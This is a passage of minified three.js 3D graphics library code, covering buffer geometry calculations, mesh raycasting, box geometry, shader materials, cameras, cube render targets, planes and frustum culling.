values.',this)}computeBoundingSphere(){this.boundingSphere===null&&(this.boundingSphere=new ti);const t=this.attributes.position,e=this.morphAttributes.position;if(t&&t.isGLBufferAttribute){console.error('THREE.BufferGeometry.computeBoundingSphere(): GLBufferAttribute requires a manual bounding sphere. Alternatively set "mesh.frustumCulled" to "false".',this),this.boundingSphere.set(new L,1/0);return}if(t){const n=this.boundingSphere.center;if(be.setFromBufferAttribute(t),e)for(let s=0,o=e.length;s<o;s++){const a=e[s];oi.setFromBufferAttribute(a),this.morphTargetsRelative?(oe.addVectors(be.min,oi.min),be.expandByPoint(oe),oe.addVectors(be.max,oi.max),be.expandByPoint(oe)):(be.expandByPoint(oi.min),be.expandByPoint(oi.max))}be.getCenter(n);let r=0;for(let s=0,o=t.count;s<o;s++)oe.fromBufferAttribute(t,s),r=Math.max(r,n.distanceToSquared(oe));if(e)for(let s=0,o=e.length;s<o;s++){const a=e[s],l=this.morphTargetsRelative;for(let c=0,u=a.count;c<u;c++)oe.fromBufferAttribute(a,c),l&&(Fn.fromBufferAttribute(t,c),oe.add(Fn)),r=Math.max(r,n.distanceToSquared(oe))}this.boundingSphere.radius=Math.sqrt(r),isNaN(this.boundingSphere.radius)&&console.error('THREE.BufferGeometry.computeBoundingSphere(): Computed radius is NaN. The "position" attribute is likely to have NaN values.',this)}}computeTangents(){const t=this.index,e=this.attributes;if(t===null||e.position===void 0||e.normal===void 0||e.uv===void 0){console.error("THREE.BufferGeometry: .computeTangents() failed. Missing required attributes (index, position, normal or uv)");return}const n=t.array,r=e.position.array,s=e.normal.array,o=e.uv.array,a=r.length/3;this.hasAttribute("tangent")===!1&&this.setAttribute("tangent",new Be(new Float32Array(4*a),4));const l=this.getAttribute("tangent").array,c=[],u=[];for(let R=0;R<a;R++)c[R]=new L,u[R]=new L;const h=new L,p=new L,m=new L,E=new zt,x=new zt,f=new zt,d=new L,g=new L;function _(R,k,X){h.fromArray(r,R*3),p.fromArray(r,k*3),m.fromArray(r,X*3),E.fromArray(o,R*2),x.fromArray(o,k*2),f.fromArray(o,X*2),p.sub(h),m.sub(h),x.sub(E),f.sub(E);const et=1/(x.x*f.y-f.x*x.y);isFinite(et)&&(d.copy(p).multiplyScalar(f.y).addScaledVector(m,-x.y).multiplyScalar(et),g.copy(m).multiplyScalar(x.x).addScaledVector(p,-f.x).multiplyScalar(et),c[R].add(d),c[k].add(d),c[X].add(d),u[R].add(g),u[k].add(g),u[X].add(g))}let v=this.groups;v.length===0&&(v=[{start:0,count:n.length}]);for(let R=0,k=v.length;R<k;++R){const X=v[R],et=X.start,P=X.count;for(let B=et,W=et+P;B<W;B+=3)_(n[B+0],n[B+1],n[B+2])}const w=new L,S=new L,T=new L,D=new L;function y(R){T.fromArray(s,R*3),D.copy(T);const k=c[R];w.copy(k),w.sub(T.multiplyScalar(T.dot(k))).normalize(),S.crossVectors(D,k);const et=S.dot(u[R])<0?-1:1;l[R*4]=w.x,l[R*4+1]=w.y,l[R*4+2]=w.z,l[R*4+3]=et}for(let R=0,k=v.length;R<k;++R){const X=v[R],et=X.start,P=X.count;for(let B=et,W=et+P;B<W;B+=3)y(n[B+0]),y(n[B+1]),y(n[B+2])}}computeVertexNormals(){const t=this.index,e=this.getAttribute("position");if(e!==void 0){let n=this.getAttribute("normal");if(n===void 0)n=new Be(new Float32Array(e.count*3),3),this.setAttribute("normal",n);else for(let p=0,m=n.count;p<m;p++)n.setXYZ(p,0,0,0);const r=new L,s=new L,o=new L,a=new L,l=new L,c=new L,u=new L,h=new L;if(t)for(let p=0,m=t.count;p<m;p+=3){const E=t.getX(p+0),x=t.getX(p+1),f=t.getX(p+2);r.fromBufferAttribute(e,E),s.fromBufferAttribute(e,x),o.fromBufferAttribute(e,f),u.subVectors(o,s),h.subVectors(r,s),u.cross(h),a.fromBufferAttribute(n,E),l.fromBufferAttribute(n,x),c.fromBufferAttribute(n,f),a.add(u),l.add(u),c.add(u),n.setXYZ(E,a.x,a.y,a.z),n.setXYZ(x,l.x,l.y,l.z),n.setXYZ(f,c.x,c.y,c.z)}else for(let p=0,m=e.count;p<m;p+=3)r.fromBufferAttribute(e,p+0),s.fromBufferAttribute(e,p+1),o.fromBufferAttribute(e,p+2),u.subVectors(o,s),h.subVectors(r,s),u.cross(h),n.setXYZ(p+0,u.x,u.y,u.z),n.setXYZ(p+1,u.x,u.y,u.z),n.setXYZ(p+2,u.x,u.y,u.z);this.normalizeNormals(),n.needsUpdate=!0}}normalizeNormals(){const t=this.attributes.normal;for(let e=0,n=t.count;e<n;e++)oe.fromBufferAttribute(t,e),oe.normalize(),t.setXYZ(e,oe.x,oe.y,oe.z)}toNonIndexed(){function t(a,l){const c=a.array,u=a.itemSize,h=a.normalized,p=new c.constructor(l.length*u);let m=0,E=0;for(let x=0,f=l.length;x<f;x++){a.isInterleavedBufferAttribute?m=l[x]*a.data.stride+a.offset:m=l[x]*u;for(let d=0;d<u;d++)p[E++]=c[m++]}return new Be(p,u,h)}if(this.index===null)return console.warn("THREE.BufferGeometry.toNonIndexed(): BufferGeometry is already non-indexed."),this;const e=new Ie,n=this.index.array,r=this.attributes;for(const a in r){const l=r[a],c=t(l,n);e.setAttribute(a,c)}const s=this.morphAttributes;for(const a in s){const l=[],c=s[a];for(let u=0,h=c.length;u<h;u++){const p=c[u],m=t(p,n);l.push(m)}e.morphAttributes[a]=l}e.morphTargetsRelative=this.morphTargetsRelative;const o=this.groups;for(let a=0,l=o.length;a<l;a++){const c=o[a];e.addGroup(c.start,c.count,c.materialIndex)}return e}toJSON(){const t={metadata:{version:4.6,type:"BufferGeometry",generator:"BufferGeometry.toJSON"}};if(t.uuid=this.uuid,t.type=this.type,this.name!==""&&(t.name=this.name),Object.keys(this.userData).length>0&&(t.userData=this.userData),this.parameters!==void 0){const l=this.parameters;for(const c in l)l[c]!==void 0&&(t[c]=l[c]);return t}t.data={attributes:{}};const e=this.index;e!==null&&(t.data.index={type:e.array.constructor.name,array:Array.prototype.slice.call(e.array)});const n=this.attributes;for(const l in n){const c=n[l];t.data.attributes[l]=c.toJSON(t.data)}const r={};let s=!1;for(const l in this.morphAttributes){const c=this.morphAttributes[l],u=[];for(let h=0,p=c.length;h<p;h++){const m=c[h];u.push(m.toJSON(t.data))}u.length>0&&(r[l]=u,s=!0)}s&&(t.data.morphAttributes=r,t.data.morphTargetsRelative=this.morphTargetsRelative);const o=this.groups;o.length>0&&(t.data.groups=JSON.parse(JSON.stringify(o)));const a=this.boundingSphere;return a!==null&&(t.data.boundingSphere={center:a.center.toArray(),radius:a.radius}),t}clone(){return new this.constructor().copy(this)}copy(t){this.index=null,this.attributes={},this.morphAttributes={},this.groups=[],this.boundingBox=null,this.boundingSphere=null;const e={};this.name=t.name;const n=t.index;n!==null&&this.setIndex(n.clone(e));const r=t.attributes;for(const c in r){const u=r[c];this.setAttribute(c,u.clone(e))}const s=t.morphAttributes;for(const c in s){const u=[],h=s[c];for(let p=0,m=h.length;p<m;p++)u.push(h[p].clone(e));this.morphAttributes[c]=u}this.morphTargetsRelative=t.morphTargetsRelative;const o=t.groups;for(let c=0,u=o.length;c<u;c++){const h=o[c];this.addGroup(h.start,h.count,h.materialIndex)}const a=t.boundingBox;a!==null&&(this.boundingBox=a.clone());const l=t.boundingSphere;return l!==null&&(this.boundingSphere=l.clone()),this.drawRange.start=t.drawRange.start,this.drawRange.count=t.drawRange.count,this.userData=t.userData,this}dispose(){this.dispatchEvent({type:"dispose"})}}const fa=new Zt,hn=new ls,Li=new ti,ha=new L,kn=new L,Bn=new L,zn=new L,Dr=new L,Di=new L,Ni=new zt,Ui=new zt,Oi=new zt,ma=new L,_a=new L,ga=new L,Fi=new L,ki=new L;class He extends ye{constructor(t=new Ie,e=new pi){super(),this.isMesh=!0,this.type="Mesh",this.geometry=t,this.material=e,this.updateMorphTargets()}copy(t,e){return super.copy(t,e),t.morphTargetInfluences!==void 0&&(this.morphTargetInfluences=t.morphTargetInfluences.slice()),t.morphTargetDictionary!==void 0&&(this.morphTargetDictionary=Object.assign({},t.morphTargetDictionary)),this.material=Array.isArray(t.material)?t.material.slice():t.material,this.geometry=t.geometry,this}updateMorphTargets(){const e=this.geometry.morphAttributes,n=Object.keys(e);if(n.length>0){const r=e[n[0]];if(r!==void 0){this.morphTargetInfluences=[],this.morphTargetDictionary={};for(let s=0,o=r.length;s<o;s++){const a=r[s].name||String(s);this.morphTargetInfluences.push(0),this.morphTargetDictionary[a]=s}}}}getVertexPosition(t,e){const n=this.geometry,r=n.attributes.position,s=n.morphAttributes.position,o=n.morphTargetsRelative;e.fromBufferAttribute(r,t);const a=this.morphTargetInfluences;if(s&&a){Di.set(0,0,0);for(let l=0,c=s.length;l<c;l++){const u=a[l],h=s[l];u!==0&&(Dr.fromBufferAttribute(h,t),o?Di.addScaledVector(Dr,u):Di.addScaledVector(Dr.sub(e),u))}e.add(Di)}return e}raycast(t,e){const n=this.geometry,r=this.material,s=this.matrixWorld;r!==void 0&&(n.boundingSphere===null&&n.computeBoundingSphere(),Li.copy(n.boundingSphere),Li.applyMatrix4(s),hn.copy(t.ray).recast(t.near),!(Li.containsPoint(hn.origin)===!1&&(hn.intersectSphere(Li,ha)===null||hn.origin.distanceToSquared(ha)>(t.far-t.near)**2))&&(fa.copy(s).invert(),hn.copy(t.ray).applyMatrix4(fa),!(n.boundingBox!==null&&hn.intersectsBox(n.boundingBox)===!1)&&this._computeIntersections(t,e,hn)))}_computeIntersections(t,e,n){let r;const s=this.geometry,o=this.material,a=s.index,l=s.attributes.position,c=s.attributes.uv,u=s.attributes.uv1,h=s.attributes.normal,p=s.groups,m=s.drawRange;if(a!==null)if(Array.isArray(o))for(let E=0,x=p.length;E<x;E++){const f=p[E],d=o[f.materialIndex],g=Math.max(f.start,m.start),_=Math.min(a.count,Math.min(f.start+f.count,m.start+m.count));for(let v=g,w=_;v<w;v+=3){const S=a.getX(v),T=a.getX(v+1),D=a.getX(v+2);r=Bi(this,d,t,n,c,u,h,S,T,D),r&&(r.faceIndex=Math.floor(v/3),r.face.materialIndex=f.materialIndex,e.push(r))}}else{const E=Math.max(0,m.start),x=Math.min(a.count,m.start+m.count);for(let f=E,d=x;f<d;f+=3){const g=a.getX(f),_=a.getX(f+1),v=a.getX(f+2);r=Bi(this,o,t,n,c,u,h,g,_,v),r&&(r.faceIndex=Math.floor(f/3),e.push(r))}}else if(l!==void 0)if(Array.isArray(o))for(let E=0,x=p.length;E<x;E++){const f=p[E],d=o[f.materialIndex],g=Math.max(f.start,m.start),_=Math.min(l.count,Math.min(f.start+f.count,m.start+m.count));for(let v=g,w=_;v<w;v+=3){const S=v,T=v+1,D=v+2;r=Bi(this,d,t,n,c,u,h,S,T,D),r&&(r.faceIndex=Math.floor(v/3),r.face.materialIndex=f.materialIndex,e.push(r))}}else{const E=Math.max(0,m.start),x=Math.min(l.count,m.start+m.count);for(let f=E,d=x;f<d;f+=3){const g=f,_=f+1,v=f+2;r=Bi(this,o,t,n,c,u,h,g,_,v),r&&(r.faceIndex=Math.floor(f/3),e.push(r))}}}}function rc(i,t,e,n,r,s,o,a){let l;if(t.side===Ee?l=n.intersectTriangle(o,s,r,!0,a):l=n.intersectTriangle(r,s,o,t.side===cn,a),l===null)return null;ki.copy(a),ki.applyMatrix4(i.matrixWorld);const c=e.ray.origin.distanceTo(ki);return c<e.near||c>e.far?null:{distance:c,point:ki.clone(),object:i}}function Bi(i,t,e,n,r,s,o,a,l,c){i.getVertexPosition(a,kn),i.getVertexPosition(l,Bn),i.getVertexPosition(c,zn);const u=rc(i,t,e,n,kn,Bn,zn,Fi);if(u){r&&(Ni.fromBufferAttribute(r,a),Ui.fromBufferAttribute(r,l),Oi.fromBufferAttribute(r,c),u.uv=Ue.getInterpolation(Fi,kn,Bn,zn,Ni,Ui,Oi,new zt)),s&&(Ni.fromBufferAttribute(s,a),Ui.fromBufferAttribute(s,l),Oi.fromBufferAttribute(s,c),u.uv1=Ue.getInterpolation(Fi,kn,Bn,zn,Ni,Ui,Oi,new zt),u.uv2=u.uv1),o&&(ma.fromBufferAttribute(o,a),_a.fromBufferAttribute(o,l),ga.fromBufferAttribute(o,c),u.normal=Ue.getInterpolation(Fi,kn,Bn,zn,ma,_a,ga,new L),u.normal.dot(n.direction)>0&&u.normal.multiplyScalar(-1));const h={a,b:l,c,normal:new L,materialIndex:0};Ue.getNormal(kn,Bn,zn,h.normal),u.face=h}return u}class vi extends Ie{constructor(t=1,e=1,n=1,r=1,s=1,o=1){super(),this.type="BoxGeometry",this.parameters={width:t,height:e,depth:n,widthSegments:r,heightSegments:s,depthSegments:o};const a=this;r=Math.floor(r),s=Math.floor(s),o=Math.floor(o);const l=[],c=[],u=[],h=[];let p=0,m=0;E("z","y","x",-1,-1,n,e,t,o,s,0),E("z","y","x",1,-1,n,e,-t,o,s,1),E("x","z","y",1,1,t,n,e,r,o,2),E("x","z","y",1,-1,t,n,-e,r,o,3),E("x","y","z",1,-1,t,e,n,r,s,4),E("x","y","z",-1,-1,t,e,-n,r,s,5),this.setIndex(l),this.setAttribute("position",new de(c,3)),this.setAttribute("normal",new de(u,3)),this.setAttribute("uv",new de(h,2));function E(x,f,d,g,_,v,w,S,T,D,y){const R=v/T,k=w/D,X=v/2,et=w/2,P=S/2,B=T+1,W=D+1;let Y=0,H=0;const V=new L;for(let q=0;q<W;q++){const J=q*k-et;for(let K=0;K<B;K++){const G=K*R-X;V[x]=G*g,V[f]=J*_,V[d]=P,c.push(V.x,V.y,V.z),V[x]=0,V[f]=0,V[d]=S>0?1:-1,u.push(V.x,V.y,V.z),h.push(K/T),h.push(1-q/D),Y+=1}}for(let q=0;q<D;q++)for(let J=0;J<T;J++){const K=p+J+B*q,G=p+J+B*(q+1),j=p+(J+1)+B*(q+1),rt=p+(J+1)+B*q;l.push(K,G,rt),l.push(G,j,rt),H+=6}a.addGroup(m,H,y),m+=H,p+=Y}}copy(t){return super.copy(t),this.parameters=Object.assign({},t.parameters),this}static fromJSON(t){return new vi(t.width,t.height,t.depth,t.widthSegments,t.heightSegments,t.depthSegments)}}function Jn(i){const t={};for(const e in i){t[e]={};for(const n in i[e]){const r=i[e][n];r&&(r.isColor||r.isMatrix3||r.isMatrix4||r.isVector2||r.isVector3||r.isVector4||r.isTexture||r.isQuaternion)?r.isRenderTargetTexture?(console.warn("UniformsUtils: Textures of render targets cannot be cloned via cloneUniforms() or mergeUniforms()."),t[e][n]=null):t[e][n]=r.clone():Array.isArray(r)?t[e][n]=r.slice():t[e][n]=r}}return t}function _e(i){const t={};for(let e=0;e<i.length;e++){const n=Jn(i[e]);for(const r in n)t[r]=n[r]}return t}function sc(i){const t=[];for(let e=0;e<i.length;e++)t.push(i[e].clone());return t}function Eo(i){return i.getRenderTarget()===null?i.outputColorSpace:Wt.workingColorSpace}const ac={clone:Jn,merge:_e};var oc=`void main() {
	gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );
}`,lc=`void main() {
	gl_FragColor = vec4( 1.0, 0.0, 0.0, 1.0 );
}`;class An extends gi{constructor(t){super(),this.isShaderMaterial=!0,this.type="ShaderMaterial",this.defines={},this.uniforms={},this.uniformsGroups=[],this.vertexShader=oc,this.fragmentShader=lc,this.linewidth=1,this.wireframe=!1,this.wireframeLinewidth=1,this.fog=!1,this.lights=!1,this.clipping=!1,this.forceSinglePass=!0,this.extensions={derivatives:!1,fragDepth:!1,drawBuffers:!1,shaderTextureLOD:!1,clipCullDistance:!1},this.defaultAttributeValues={color:[1,1,1],uv:[0,0],uv1:[0,0]},this.index0AttributeName=void 0,this.uniformsNeedUpdate=!1,this.glslVersion=null,t!==void 0&&this.setValues(t)}copy(t){return super.copy(t),this.fragmentShader=t.fragmentShader,this.vertexShader=t.vertexShader,this.uniforms=Jn(t.uniforms),this.uniformsGroups=sc(t.uniformsGroups),this.defines=Object.assign({},t.defines),this.wireframe=t.wireframe,this.wireframeLinewidth=t.wireframeLinewidth,this.fog=t.fog,this.lights=t.lights,this.clipping=t.clipping,this.extensions=Object.assign({},t.extensions),this.glslVersion=t.glslVersion,this}toJSON(t){const e=super.toJSON(t);e.glslVersion=this.glslVersion,e.uniforms={};for(const r in this.uniforms){const o=this.uniforms[r].value;o&&o.isTexture?e.uniforms[r]={type:"t",value:o.toJSON(t).uuid}:o&&o.isColor?e.uniforms[r]={type:"c",value:o.getHex()}:o&&o.isVector2?e.uniforms[r]={type:"v2",value:o.toArray()}:o&&o.isVector3?e.uniforms[r]={type:"v3",value:o.toArray()}:o&&o.isVector4?e.uniforms[r]={type:"v4",value:o.toArray()}:o&&o.isMatrix3?e.uniforms[r]={type:"m3",value:o.toArray()}:o&&o.isMatrix4?e.uniforms[r]={type:"m4",value:o.toArray()}:e.uniforms[r]={value:o}}Object.keys(this.defines).length>0&&(e.defines=this.defines),e.vertexShader=this.vertexShader,e.fragmentShader=this.fragmentShader,e.lights=this.lights,e.clipping=this.clipping;const n={};for(const r in this.extensions)this.extensions[r]===!0&&(n[r]=!0);return Object.keys(n).length>0&&(e.extensions=n),e}}class yo extends ye{constructor(){super(),this.isCamera=!0,this.type="Camera",this.matrixWorldInverse=new Zt,this.projectionMatrix=new Zt,this.projectionMatrixInverse=new Zt,this.coordinateSystem=Ke}copy(t,e){return super.copy(t,e),this.matrixWorldInverse.copy(t.matrixWorldInverse),this.projectionMatrix.copy(t.projectionMatrix),this.projectionMatrixInverse.copy(t.projectionMatrixInverse),this.coordinateSystem=t.coordinateSystem,this}getWorldDirection(t){return super.getWorldDirection(t).negate()}updateMatrixWorld(t){super.updateMatrixWorld(t),this.matrixWorldInverse.copy(this.matrixWorld).invert()}updateWorldMatrix(t,e){super.updateWorldMatrix(t,e),this.matrixWorldInverse.copy(this.matrixWorld).invert()}clone(){return new this.constructor().copy(this)}}class Ce extends yo{constructor(t=50,e=1,n=.1,r=2e3){super(),this.isPerspectiveCamera=!0,this.type="PerspectiveCamera",this.fov=t,this.zoom=1,this.near=n,this.far=r,this.focus=10,this.aspect=e,this.view=null,this.filmGauge=35,this.filmOffset=0,this.updateProjectionMatrix()}copy(t,e){return super.copy(t,e),this.fov=t.fov,this.zoom=t.zoom,this.near=t.near,this.far=t.far,this.focus=t.focus,this.aspect=t.aspect,this.view=t.view===null?null:Object.assign({},t.view),this.filmGauge=t.filmGauge,this.filmOffset=t.filmOffset,this}setFocalLength(t){const e=.5*this.getFilmHeight()/t;this.fov=ts*2*Math.atan(e),this.updateProjectionMatrix()}getFocalLength(){const t=Math.tan(_r*.5*this.fov);return .5*this.getFilmHeight()/t}getEffectiveFOV(){return ts*2*Math.atan(Math.tan(_r*.5*this.fov)/this.zoom)}getFilmWidth(){return this.filmGauge*Math.min(this.aspect,1)}getFilmHeight(){return this.filmGauge/Math.max(this.aspect,1)}setViewOffset(t,e,n,r,s,o){this.aspect=t/e,this.view===null&&(this.view={enabled:!0,fullWidth:1,fullHeight:1,offsetX:0,offsetY:0,width:1,height:1}),this.view.enabled=!0,this.view.fullWidth=t,this.view.fullHeight=e,this.view.offsetX=n,this.view.offsetY=r,this.view.width=s,this.view.height=o,this.updateProjectionMatrix()}clearViewOffset(){this.view!==null&&(this.view.enabled=!1),this.updateProjectionMatrix()}updateProjectionMatrix(){const t=this.near;let e=t*Math.tan(_r*.5*this.fov)/this.zoom,n=2*e,r=this.aspect*n,s=-.5*r;const o=this.view;if(this.view!==null&&this.view.enabled){const l=o.fullWidth,c=o.fullHeight;s+=o.offsetX*r/l,e-=o.offsetY*n/c,r*=o.width/l,n*=o.height/c}const a=this.filmOffset;a!==0&&(s+=t*a/this.getFilmWidth()),this.projectionMatrix.makePerspective(s,s+r,e,e-n,t,this.far,this.coordinateSystem),this.projectionMatrixInverse.copy(this.projectionMatrix).invert()}toJSON(t){const e=super.toJSON(t);return e.object.fov=this.fov,e.object.zoom=this.zoom,e.object.near=this.near,e.object.far=this.far,e.object.focus=this.focus,e.object.aspect=this.aspect,this.view!==null&&(e.object.view=Object.assign({},this.view)),e.object.filmGauge=this.filmGauge,e.object.filmOffset=this.filmOffset,e}}const Gn=-90,Hn=1;class cc extends ye{constructor(t,e,n){super(),this.type="CubeCamera",this.renderTarget=n,this.coordinateSystem=null,this.activeMipmapLevel=0;const r=new Ce(Gn,Hn,t,e);r.layers=this.layers,this.add(r);const s=new Ce(Gn,Hn,t,e);s.layers=this.layers,this.add(s);const o=new Ce(Gn,Hn,t,e);o.layers=this.layers,this.add(o);const a=new Ce(Gn,Hn,t,e);a.layers=this.layers,this.add(a);const l=new Ce(Gn,Hn,t,e);l.layers=this.layers,this.add(l);const c=new Ce(Gn,Hn,t,e);c.layers=this.layers,this.add(c)}updateCoordinateSystem(){const t=this.coordinateSystem,e=this.children.concat(),[n,r,s,o,a,l]=e;for(const c of e)this.remove(c);if(t===Ke)n.up.set(0,1,0),n.lookAt(1,0,0),r.up.set(0,1,0),r.lookAt(-1,0,0),s.up.set(0,0,-1),s.lookAt(0,1,0),o.up.set(0,0,1),o.lookAt(0,-1,0),a.up.set(0,1,0),a.lookAt(0,0,1),l.up.set(0,1,0),l.lookAt(0,0,-1);else if(t===Zi)n.up.set(0,-1,0),n.lookAt(-1,0,0),r.up.set(0,-1,0),r.lookAt(1,0,0),s.up.set(0,0,1),s.lookAt(0,1,0),o.up.set(0,0,-1),o.lookAt(0,-1,0),a.up.set(0,-1,0),a.lookAt(0,0,1),l.up.set(0,-1,0),l.lookAt(0,0,-1);else throw new Error("THREE.CubeCamera.updateCoordinateSystem(): Invalid coordinate system: "+t);for(const c of e)this.add(c),c.updateMatrixWorld()}update(t,e){this.parent===null&&this.updateMatrixWorld();const{renderTarget:n,activeMipmapLevel:r}=this;this.coordinateSystem!==t.coordinateSystem&&(this.coordinateSystem=t.coordinateSystem,this.updateCoordinateSystem());const[s,o,a,l,c,u]=this.children,h=t.getRenderTarget(),p=t.getActiveCubeFace(),m=t.getActiveMipmapLevel(),E=t.xr.enabled;t.xr.enabled=!1;const x=n.texture.generateMipmaps;n.texture.generateMipmaps=!1,t.setRenderTarget(n,0,r),t.render(e,s),t.setRenderTarget(n,1,r),t.render(e,o),t.setRenderTarget(n,2,r),t.render(e,a),t.setRenderTarget(n,3,r),t.render(e,l),t.setRenderTarget(n,4,r),t.render(e,c),n.texture.generateMipmaps=x,t.setRenderTarget(n,5,r),t.render(e,u),t.setRenderTarget(h,p,m),t.xr.enabled=E,n.texture.needsPMREMUpdate=!0}}class Mo extends Te{constructor(t,e,n,r,s,o,a,l,c,u){t=t!==void 0?t:[],e=e!==void 0?e:$n,super(t,e,n,r,s,o,a,l,c,u),this.isCubeTexture=!0,this.flipY=!1}get images(){return this.image}set images(t){this.image=t}}class dc extends Tn{constructor(t=1,e={}){super(t,t,e),this.isWebGLCubeRenderTarget=!0;const n={width:t,height:t,depth:1},r=[n,n,n,n,n,n];e.encoding!==void 0&&(ui("THREE.WebGLCubeRenderTarget: option.encoding has been replaced by option.colorSpace."),e.colorSpace=e.encoding===Sn?le:Pe),this.texture=new Mo(r,e.mapping,e.wrapS,e.wrapT,e.magFilter,e.minFilter,e.format,e.type,e.anisotropy,e.colorSpace),this.texture.isRenderTargetTexture=!0,this.texture.generateMipmaps=e.generateMipmaps!==void 0?e.generateMipmaps:!1,this.texture.minFilter=e.minFilter!==void 0?e.minFilter:we}fromEquirectangularTexture(t,e){this.texture.type=e.type,this.texture.colorSpace=e.colorSpace,this.texture.generateMipmaps=e.generateMipmaps,this.texture.minFilter=e.minFilter,this.texture.magFilter=e.magFilter;const n={uniforms:{tEquirect:{value:null}},vertexShader:`

				varying vec3 vWorldDirection;

				vec3 transformDirection( in vec3 dir, in mat4 matrix ) {

					return normalize( ( matrix * vec4( dir, 0.0 ) ).xyz );

				}

				void main() {

					vWorldDirection = transformDirection( position, modelMatrix );

					#include <begin_vertex>
					#include <project_vertex>

				}
			`,fragmentShader:`

				uniform sampler2D tEquirect;

				varying vec3 vWorldDirection;

				#include <common>

				void main() {

					vec3 direction = normalize( vWorldDirection );

					vec2 sampleUV = equirectUv( direction );

					gl_FragColor = texture2D( tEquirect, sampleUV );

				}
			`},r=new vi(5,5,5),s=new An({name:"CubemapFromEquirect",uniforms:Jn(n.uniforms),vertexShader:n.vertexShader,fragmentShader:n.fragmentShader,side:Ee,blending:an});s.uniforms.tEquirect.value=e;const o=new He(r,s),a=e.minFilter;return e.minFilter===fi&&(e.minFilter=we),new cc(1,10,this).update(t,o),e.minFilter=a,o.geometry.dispose(),o.material.dispose(),this}clear(t,e,n,r){const s=t.getRenderTarget();for(let o=0;o<6;o++)t.setRenderTarget(this,o),t.clear(e,n,r);t.setRenderTarget(s)}}const Nr=new L,uc=new L,pc=new kt;class _n{constructor(t=new L(1,0,0),e=0){this.isPlane=!0,this.normal=t,this.constant=e}set(t,e){return this.normal.copy(t),this.constant=e,this}setComponents(t,e,n,r){return this.normal.set(t,e,n),this.constant=r,this}setFromNormalAndCoplanarPoint(t,e){return this.normal.copy(t),this.constant=-e.dot(this.normal),this}setFromCoplanarPoints(t,e,n){const r=Nr.subVectors(n,e).cross(uc.subVectors(t,e)).normalize();return this.setFromNormalAndCoplanarPoint(r,t),this}copy(t){return this.normal.copy(t.normal),this.constant=t.constant,this}normalize(){const t=1/this.normal.length();return this.normal.multiplyScalar(t),this.constant*=t,this}negate(){return this.constant*=-1,this.normal.negate(),this}distanceToPoint(t){return this.normal.dot(t)+this.constant}distanceToSphere(t){return this.distanceToPoint(t.center)-t.radius}projectPoint(t,e){return e.copy(t).addScaledVector(this.normal,-this.distanceToPoint(t))}intersectLine(t,e){const n=t.delta(Nr),r=this.normal.dot(n);if(r===0)return this.distanceToPoint(t.start)===0?e.copy(t.start):null;const s=-(t.start.dot(this.normal)+this.constant)/r;return s<0||s>1?null:e.copy(t.start).addScaledVector(n,s)}intersectsLine(t){const e=this.distanceToPoint(t.start),n=this.distanceToPoint(t.end);return e<0&&n>0||n<0&&e>0}intersectsBox(t){return t.intersectsPlane(this)}intersectsSphere(t){return t.intersectsPlane(this)}coplanarPoint(t){return t.copy(this.normal).multiplyScalar(-this.constant)}applyMatrix4(t,e){const n=e||pc.getNormalMatrix(t),r=this.coplanarPoint(Nr).applyMatrix4(t),s=this.normal.applyMatrix3(n).normalize();return this.constant=-r.dot(s),this}translate(t){return this.constant-=t.dot(this.normal),this}equals(t){return t.normal.equals(this.normal)&&t.constant===this.constant}clone(){return new this.constructor().copy(this)}}const mn=new ti,zi=new L;class So{constructor(t=new _n,e=new _n,n=new _n,r=new _n,s=new _n,o=new _n){this.planes=[t,e,n,r,s,o]}set(t,e,n,r,s,o){const a=this.planes;return a[0].copy(t),a[1].copy(e),a[2].copy(n),a[3].copy(r),a[4].copy(s),a[5].copy(o),this}copy(t){const e=this.planes;for(let n=0;n<6;n++)e[n].copy(t.planes[n]);return this}setFromProjectionMatrix(t,e=Ke){const n=this.planes,r=t.elements,s=r[0],o=r[1],a=r[2],l=r[3],c=r[4],u=r[5],h=r[6],p=r[7],m=r[8],E=r[9],x=r[10],f=r[11],d=r[12],g=r[13],_=r[14],v=r[15];if(n[0].setComponents(l-s,p-c,f-m,v-d).normalize(),n[1].setComponents(l+s,p+c,f+m,v+d).normalize(),n[2].setComponents(l+o,p+u,f+E,v+g).normalize(),n[3].setComponents(l-o,p-u,f-E,v-g).normalize(),n[4].setComponents(l-a,p-h,f-x,v-_).normalize(),e===Ke)n[5].setComponents(l+a,p+h,f+x,v+_).normalize();else if(e===Zi)n[5].setComponents(a,h,x,_).normalize();else throw new Error("THREE.Frustum.setFromProjectionMatrix(): Invalid coordinate system: "+e);return this}intersectsObject(t){if(t.boundingSphere!==void 0)t.boundingSphere===null&&t.computeBoundingSphere(),mn.copy(t.boundingSphere).applyMatrix4(t.matrixWorld);else{const e=t.geometry;e.boundingSphere===null&&e.computeBoundingSphere(),mn.copy(e.boundingSphere).applyMatrix4(t.matrixWorld)}return this.intersectsSphere(mn)}intersectsSprite(t){return mn.center.set(0,0,0),mn.radius=.7071067811865476,mn.applyMatrix4(t.matrixWorld),this.intersectsSphere(mn)}intersectsSphere(t){const e=this.planes,n=t.center,r=-t.radius;for(let s=0;s<6;s++)if(e[s].distanceToPoint(n)<r)return!1;return!0}intersectsBox(t){const e=this.planes;for(let n=0;n<6;n++){const r=e[n];if(zi.x=r.normal.x>0?t.max.x:t.min.x,zi.y=r.normal.y>0?t.max.y:t.min.y,zi.z=r.normal.z>0?t.max.z:t.min.z,r.distanceToPoint(zi)<0)return!1}return!0}containsPoint(t){const e=this.planes;for(let n=0;n<6;n++)if(e[n].distanceToPoint(t)<0)return!1;return!0}clone(){return new this.constructor().copy(this)}}function bo(){let i=null,t=!1,e=null,n=null;function r(s,o){e(s,o),n=i.requestAnimationFrame(r)}return{start:function(){t!==!0&&e!==null&&(n=i.requestAnimationFrame(r),t=!0)},stop:function(){i.cancelAnimationFrame(n),t=!1},setAnimationLoop:function(s){e=s},setContext:function(s){i=s}}}function fc(i,t){const e=t.isWebGL2,n=new WeakMap;function r(c,u){const h=c.array,p=c.usage,m=h.byteLength,E=i.createBuffer();i.bindBuffer(u,E),i.bufferData(u,h,p),c.onUploadCallback();let x;if(h instanceof Float32Array)x=i.FLOAT;else if(h instanceof Uint16Array)if(c.isFloat16BufferAttribute)if(e)x=i.HALF_FLOAT;else throw new Error("THREE.WebGLAttributes: Usage of Float16BufferAttribute requires WebGL2.");else x=i.UNSIGNED_SHORT;else if(h instanceof Int16Array)x=i.SHORT;else if(h instanceof Uint32Array)x=i.UNSIGNED_INT;else if(h instanceof Int32Array)x=i.INT;else if(h instanceof Int8Array)x=i.BYTE;else if(h instanceof Uint8Array)x=i.UNSIGNED_BYTE;else if(h instanceof 